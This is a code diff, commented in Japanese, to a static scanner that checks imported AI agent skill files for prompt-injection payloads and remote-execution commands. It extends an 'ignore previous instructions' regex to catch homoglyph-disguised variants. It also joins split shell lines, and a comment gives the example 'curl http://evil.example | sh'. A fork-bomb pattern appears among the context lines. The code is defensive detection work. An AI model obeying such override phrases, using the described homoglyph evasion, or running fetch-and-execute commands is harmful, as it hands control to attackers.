@@ -158,13 +158,36 @@ _PATTERNS: List[Tuple[str, str, str, Pattern[str]]] = [
         re.compile(r":\(\)\s*\{\s*:\|:&\s*\}\s*;\s*:"),
     ),
     # prompt_injection / MEDIUM — SKILL.md 等に埋め込まれた注入ペイロード。
+    #
+    # #537 round7 是正（レビュー I1）: 固定構造 `ignore … previous instructions` の
+    # 「…」部分（`all`/`the`/`any` 等の限定子）が非ASCII/mixed-script の confusable
+    # （例: キリル文字 `а` U+0430 を紛れ込ませた `аll`）に置き換えられると、旧実装は
+    # `(all\s+|the\s+|any\s+)?` が ASCII 文字列リテラルのみを許容していたため
+    # マッチしなかった（レビュー実測: `ignore аll previous instructions` が非検出）。
+    # UTS #39 の confusables テーブル（数千エントリ）を導入せずとも、「`ignore` と
+    # `previous` の間に短い1トークンの空白が挟まりうる」という固定 grammar の緩和
+    # だけで、中身が何であれ（ASCII でも非ASCII混在でも）検出できる。
+    # スコープを絞るため、フィラー（`ignore` と `previous` の間の1トークン）は
+    # 次の2通りのみ許容する: ①元の限定子と完全一致（`all`/`the`/`any`、ASCII）
+    # ②非ASCII文字を1文字以上含む 1〜12 文字のトークン（confusable homoglyph
+    # 対策・lookahead `(?=\S*[^\x00-\x7F])` で判定）。②を「任意の1〜12文字
+    # トークン」まで緩めると、無関係な英文（例: "ignore setting; previous
+    # instructions still apply..."）まで拾う新規 FP を作ることを変異試験で実測
+    # したため、非ASCII文字を含む場合のみに限定して塞いだ。直後に
+    # `previous|prior|above` と `instructions?|prompts?|rules?` という固定の
+    # ASCII skeleton が続くことは変わらず要求する（skeleton 自体は confusable
+    # 化しない — remote_exec 側の `curl`/`sh` 等のコマンド名 confusable
+    # — 例: `сurl`（キリル `с`）— は別クラスの回避手段であり、シェルは
+    # confusable なコマンド名を元のコマンドとして解釈しないため実害が無く
+    # #547 のスコープに残す。prompt_injection の confusable と remote_exec の
+    # confusable を混同しない）。
     (
         "prompt_injection.ignore_previous",
         "prompt_injection",
         "MEDIUM",
         re.compile(
-            r"(?i)ignore\s+(all\s+|the\s+|any\s+)?(previous|prior|above)\s+"
-            r"(instructions?|prompts?|rules?)"
+            r"(?i)ignore\s+(?:(?:all|the|any)\s+|(?=\S*[^\x00-\x7F])\S{1,12}\s+)?"
+            r"(previous|prior|above)\s+(instructions?|prompts?|rules?)"
         ),
     ),
     (
@@ -833,6 +856,116 @@ def _iter_scopes(path: Path, text: str) -> List[List[Tuple[int, str]]]:
     return [list(enumerate(lines, start=1))]
 
 
+# ============================================================================
+# シェル論理行の結合（物理改行によるパターン分断の是正・#537 round7 レビュー I5）
+# ----------------------------------------------------------------------------
+# シェルは行末が `|`（バックスラッシュ無しでも次行をパイプライン継続として読む）
+# または `\`（明示的な行継続）で終わると、複数の物理行を 1 つの論理行として実行
+# する。`_scan_line` は行単位 regex（同一行 combo 前提）のため、
+#     curl http://evil.example |
+#     sh
+# のように combo を 2 物理行に分断されると `remote_exec.curl_pipe_sh` を検出
+# できない（bash は 1 パイプラインとして実行する一方、scanner は両方とも []。
+# レビュー実測 #537 round7 I5）。
+#
+# 「シェル上どこで論理行が区切れるか」の判定を本節に集約する（1箇所で完結させる
+# 設計＝レビュー指示）。今回実装するのは末尾 `|`・末尾 `\` の2種のみだが、
+# `&&`/`||`/`;`/ヒアドキュメント/複数行 `$( )` 等を今後追加する場合も
+# `_is_shell_continuation` と `_join_logical_lines` の2関数だけを変更すれば足りる
+# 構造にする（個別の記号を検出箇所ごとに1つずつ足す実装にしない）。
+#
+# 適用範囲は `.sh`/`.bash` ファイル全体、および Markdown 内のシェル系 fenced code
+# block（info string が sh/bash/zsh/ksh/dash/shell/console のいずれか）の中身に限定
+# する。Markdown の表（`| col1 | col2 |`）は `|` を多用するため、シェルスコープ外
+# では本結合を適用しない（陽性対照: 表を誤って論理行結合しない）。
+# ============================================================================
+
+_SHELL_FENCE_INFO = {"sh", "bash", "zsh", "ksh", "dash", "shell", "console"}
+_TRAILING_PIPE_RE = re.compile(r"\|\s*$")
+_TRAILING_BACKSLASH_RE = re.compile(r"\\\s*$")
+
+
+def _is_shell_continuation(stripped_line: str) -> bool:
+    """行が次の物理行へ継続するシェル論理行の一部かどうか（末尾 `|` または `\\`）。"""
+    return bool(
+        _TRAILING_PIPE_RE.search(stripped_line)
+        or _TRAILING_BACKSLASH_RE.search(stripped_line)
+    )
+
+
+def _compute_shell_scope_lines(lines: List[str]) -> set:
+    """行番号（1始まり）の集合を返す。Markdown 内のシェル系 fenced code block
+    （info string が `_SHELL_FENCE_INFO`）の**中身**の行のみを対象とする
+    （fence マーカー行自体は含めない）。フェンス判定は `_compute_literal_zone_lines`
+    と同じ「同種・同じ長さ以上の closer が実際に見つかった場合のみ閉じたとみなす」
+    原則を再利用する（未閉じフェンスはスコープに含めず、以降のフェンス走査も
+    打ち切る）。
+    """
+    scope: set = set()
+    n = len(lines)
+    stripped_lines = [raw.rstrip("\r\n") for raw in lines]
+    idx = 0
+    while idx < n:
+        opener = _match_fence_opener(stripped_lines[idx])
+        if opener is None:
+            idx += 1
+            continue
+        ch, min_len = opener
+        m = _FENCE_OPENER.match(stripped_lines[idx])
+        info = m.group(2) if m else ""
+        info_word = info.strip().split()[0].lower() if info.strip() else ""
+        close_at = None
+        for j in range(idx + 1, n):
+            if _match_fence_closer(stripped_lines[j], ch, min_len):
+                close_at = j
+                break
+        if close_at is None:
+            # 未閉じ: スコープを作らず、以降のフェンス走査自体を打ち切る
+            # （`_compute_literal_zone_lines` と同方針）。
+            break
+        if info_word in _SHELL_FENCE_INFO:
+            for k in range(idx + 1, close_at):
+                scope.add(k + 1)
+        idx = close_at + 1
+    return scope
+
+
+def _join_logical_lines(
+    lines: List[str], scope_linenos: set
+) -> List[Tuple[int, str]]:
+    """scope_linenos（1始まり）に属する行のうち、シェル継続で分割された物理行を
+    1つの論理行へ結合する。戻り値は (先頭物理行番号, 結合済みテキスト) のリスト
+    （継続していない行は含めない — 呼び出し側は既存の物理行単位スキャンに
+    **追加**して使う設計で、単独行スキャンを置き換えない）。
+
+    末尾 `|` は結合後の照合に `|` 自体が必要なため残したまま次行を連結する。
+    末尾 `\\`（行継続）は記号自体を落として連結する（シェル上は改行が消えるだけで
+    バックスラッシュはコマンドの一部ではないため）。
+    """
+    out: List[Tuple[int, str]] = []
+    n = len(lines)
+    idx = 0
+    while idx < n:
+        lineno = idx + 1
+        stripped = lines[idx].rstrip("\r\n")
+        if lineno not in scope_linenos or not _is_shell_continuation(stripped):
+            idx += 1
+            continue
+        start_lineno = lineno
+        buf = stripped
+        j = idx + 1
+        while _is_shell_continuation(buf) and j < n and (j + 1) in scope_linenos:
+            nxt = lines[j].rstrip("\r\n")
+            if _TRAILING_BACKSLASH_RE.search(buf):
+                buf = _TRAILING_BACKSLASH_RE.sub("", buf).rstrip() + " " + nxt.strip()
+            else:
+                buf = buf.rstrip() + " " + nxt.strip()
+            j += 1
+        out.append((start_lineno, buf))
+        idx = j
+    return out
+
+
 def scan_skills(root: Path) -> SkillVulnReport:
     """root/skills/ 配下の取り込みスキルを静的スキャンして脆弱性 Finding を返す（決定論）。"""
     root = Path(root)
@@ -865,10 +998,31 @@ def scan_skills(root: Path) -> SkillVulnReport:
         scanned += 1
         lines = text.splitlines()
         literal_zone = _compute_literal_zone_lines(lines)
+        existing_keys: set = set()
         for idx, line in enumerate(lines, start=1):
-            findings.extend(_scan_line(rel, idx, line, idx in literal_zone))
+            for f in _scan_line(rel, idx, line, idx in literal_zone):
+                findings.append(f)
+                existing_keys.add((f.line, f.pattern_id))
         for scope in _iter_scopes(path, text):
             flow_findings.extend(_detect_flows_in_scope(rel, scope, literal_zone))
+
+        # #537 round7 是正（レビュー I5）: シェル継続行（末尾 `|`・`\`）で
+        # 物理分断された combo を論理行へ結合してから追加スキャンする。
+        # 既存の物理行単位スキャン（上）を置き換えず、そこで未検出だった
+        # (行, pattern_id) の組だけを追加する（重複 Finding を作らない）。
+        shell_scope = (
+            set(range(1, len(lines) + 1))
+            if path.suffix.lower() in (".sh", ".bash")
+            else _compute_shell_scope_lines(lines)
+        )
+        for start_lineno, joined_text in _join_logical_lines(lines, shell_scope):
+            for f in _scan_line(
+                rel, start_lineno, joined_text, start_lineno in literal_zone
+            ):
+                if (f.line, f.pattern_id) in existing_keys:
+                    continue
+                findings.append(f)
+                existing_keys.add((f.line, f.pattern_id))
 
     findings.sort(key=lambda f: (f.rel_path, f.line, f.pattern_id))
     flow_findings.sort(
